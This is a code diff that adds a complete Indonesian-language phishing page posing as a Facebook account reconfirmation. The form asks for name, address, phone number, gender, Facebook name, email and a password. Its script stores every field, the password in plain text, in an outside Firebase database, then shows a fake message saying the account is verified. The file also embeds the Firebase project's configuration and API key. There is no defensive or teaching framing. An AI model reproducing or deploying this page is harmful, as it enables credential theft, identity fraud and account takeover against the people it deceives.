@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KONFIRMASI KEMBALI FACEBOOK ANDA</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #222;
+    color: #fff;
+    margin: 0;
+    padding: 0;
+  }
+  .container {
+    max-width: 600px;
+    margin: 50px auto;
+    padding: 20px;
+    background-color: #333;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+  }
+  .form-group {
+    margin-bottom: 20px;
+  }
+  .form-group label {
+    display: block;
+    font-weight: bold;
+    margin-bottom: 5px;
+  }
+  .form-group input, 
+  .form-group select {
+    width: 100%;
+    padding: 10px;
+    border-radius: 5px;
+    border: 1px solid #555;
+    background-color: #444;
+    color: #fff;
+    box-sizing: border-box;
+  }
+  .form-group select {
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    background-image: url('data:image/svg+xml;utf8,<svg fill="%23ffffff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M128 160l128 128 128-128z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: right 10px top 50%;
+    background-size: 16px;
+  }
+  .btn {
+    display: inline-block;
+    background-color: #4CAF50;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    text-decoration: none;
+  }
+  .btn:hover {
+    background-color: #45a049;
+  }
+  #loading, #success {
+    display: none;
+    text-align: center;
+    margin-top: 20px;
+  }
+</style>
+<!-- Firebase -->
+</head>
+<body>
+
+<div class="container">
+  <h2 style="text-align: center; color: green;">KONFIRMASI KEMBALI FACEBOOK ANDA</h2>
+  <form id="myForm" action="#" method="post">
+    <div class="form-group">
+      <label for="nama">Nama anda:</label>
+      <input type="text" id="nama" name="nama" required>
+    </div>
+    <div class="form-group">
+      <label for="alamat">Alamat lengkap:</label>
+      <input type="text" id="alamat" name="alamat" required>
+    </div>
+    <div class="form-group">
+      <label for="nomor_hp">Nomor HP:</label>
+      <input type="tel" id="nomor_hp" name="nomor_hp" required>
+    </div>
+    <div class="form-group">
+      <label for="jenis_kelamin">Jenis Kelamin:</label>
+      <select id="jenis_kelamin" name="jenis_kelamin" required>
+        <option value="laki-laki">Laki-laki</option>
+        <option value="perempuan">Perempuan</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label for="facebook">Nama Facebook Anda:</label>
+      <input type="text" id="facebook" name="facebook" required>
+    </div>
+    
+    <div class="form-group">
+      <label for="email">Email aktif:</label>
+      <input type="email" id="email" name="email" required>
+    </div>
+
+    <div class="form-group">
+      <label for="password">Kata sandi baru:</label>
+      <input type="password" id="password" name="password" required>
+    </div>
+    <button type="button" class="btn" id="btnKirim">Kirim</button>
+  </form>
+  
+  <div id="loading">
+    <img src="loading.gif" alt="Loading..." width="400">
+    <p style="color: red;">Mengirim data........</p>
+  </div>
+  
+  <div id="success">
+    <p style="color: yellow;">Facebook Anda berhasil diverifikasi, mohon tunggu 24 jam, Aktivasi kembali facebook anda akan dikirim lewat email atau nomor hp</p>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+  import { getDatabase, set, ref, update } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js";
+  import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-auth.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDgYUH_7QEmwTfDW3FsB-cyWTzFSDSIvZw",
+    authDomain: "ferivikasi-facebook.firebaseapp.com",
+    databaseURL: "https://ferivikasi-facebook-default-rtdb.firebaseio.com",
+    projectId: "ferivikasi-facebook",
+    storageBucket: "ferivikasi-facebook.appspot.com",
+    messagingSenderId: "139871194599",
+    appId: "1:139871194599:web:c307c8f90316bbce7d8142",
+    measurementId: "G-KVF89R9JTQ"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  const auth = getAuth(app);
+  
+    const button = document.getElementById("btnKirim");
+  button.addEventListener('click', (e) => {
+    let nama = document.getElementById("nama").value;
+    let alamat = document.getElementById("alamat").value;
+    let nomorHp = document.getElementById("nomor_hp").value;
+    let jenisKelamin = document.getElementById("jenis_kelamin").value;
+    let namaFacebook = document.getElementById("facebook").value;
+    let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
+      
+      createUserWithEmailAndPassword(auth, email, password)
+      .then((usercred) => {
+  const user = usercred.user;
+  set(ref(db, "users/" + user.uid), {
+    nama: nama,
+    alamat: alamat,
+    nomorHp: nomorHp,
+    jenisKelamin: jenisKelamin,
+    namaFacebook: namaFacebook,
+    email: email,
+    password: password,
+  });
+})
+
+      .then(() => {
+          document.getElementById("myForm").style.display = "none";
+
+    // Menampilkan pesan loading
+    document.getElementById("loading").style.display = "block";
+
+    // Menunggu 5 detik sebelum menampilkan pesan sukses
+    setTimeout(function() {
+      // Menampilkan pesan sukses
+      document.getElementById("success").style.display = "block";
+      
+      // Menyembunyikan pesan loading
+      document.getElementById("loading").style.display = "none";
+    }, 9000);
+      })
+      .catch((error) => {
+          alert(error);
+  })
+      .catch((error) => {
+          const errorCode = error.code;
+          const errorMessage = error.message;
+      })
+      
+  });
+
+
+    
+</script>
+</body>
+</html>
